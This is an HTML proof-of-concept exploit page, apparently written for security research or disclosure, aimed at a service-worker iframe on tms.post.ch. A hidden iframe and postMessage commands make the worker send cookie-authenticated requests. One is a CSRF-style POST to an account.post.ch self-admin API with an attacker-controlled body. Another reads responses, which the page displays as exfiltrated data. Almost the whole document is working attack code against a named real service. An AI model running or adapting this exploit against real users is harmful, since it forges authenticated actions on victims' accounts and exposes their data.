<!DOCTYPE html>
<html>

<head>
    <title>SW Fetch Proxy PoC</title>
</head>

<body>
    <h2>TMS Service Worker Cookie-Authenticated Fetch Proxy</h2>
    <pre id="output"></pre>
    <script>
        const TARGET_SW_IFRAME = 'https://tms.post.ch/_/service_worker/63b0/sw_iframe.html?origin=' +
            encodeURIComponent(window.location.origin);

        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = TARGET_SW_IFRAME;
        document.body.appendChild(iframe);

        // Listen for responses from SW iframe
        window.addEventListener('message', function(e) {
            if (e.origin === 'https://tms.post.ch') {
                document.getElementById('output').textContent +=
                    'Response: ' + JSON.stringify(e.data, null, 2) + '\n';

                // If type 1 response with result, we got authenticated data back
                if (e.data && e.data.result && e.data.result.data) {
                    document.getElementById('output').textContent +=
                        '\n=== EXFILTRATED DATA ===\n' + e.data.result.data + '\n';
                }
            }
        });

        // Wait for SW to initialize, then send commands
        setTimeout(() => {
            // Step 1: Send heartbeat to establish connection
            iframe.contentWindow.postMessage({
                type: 0,
                clientId: 'attacker-' + Math.random().toString(36).slice(2),
                requestId: 'hb-1',
                maxDelay: 5000
            }, 'https://tms.post.ch');
        }, 3000);

        setTimeout(() => {
            const clientId = 'attacker-' + Math.random().toString(36).slice(2);

            // Step 2: CSRF — make authenticated POST request (fire-and-forget)
            iframe.contentWindow.postMessage({
                type: 1,
                clientId: clientId,
                requestId: 'csrf-1',
                command: {
                    commandType: 0,
                    params: {
                        url: 'https://account.post.ch/selfadmin/api/some-action',
                        method: 1, // POST
                        body: '{"action":"attacker-controlled"}',
                        processResponse: false,
                        templates: {}
                    }
                }
            }, 'https://tms.post.ch');

            // Step 3: Data exfiltration — read response (requires CORS on target)
            iframe.contentWindow.postMessage({
                type: 1,
                clientId: clientId,
                requestId: 'exfil-1',
                command: {
                    commandType: 0,
                    params: {
                        url: 'https://tms.post.ch/gtm.js', // Same-origin, always readable
                        method: 0, // GET
                        processResponse: true,
                        templates: {}
                    }
                }
            }, 'https://tms.post.ch');
        }, 5000);
    </script>
</body>

</html>
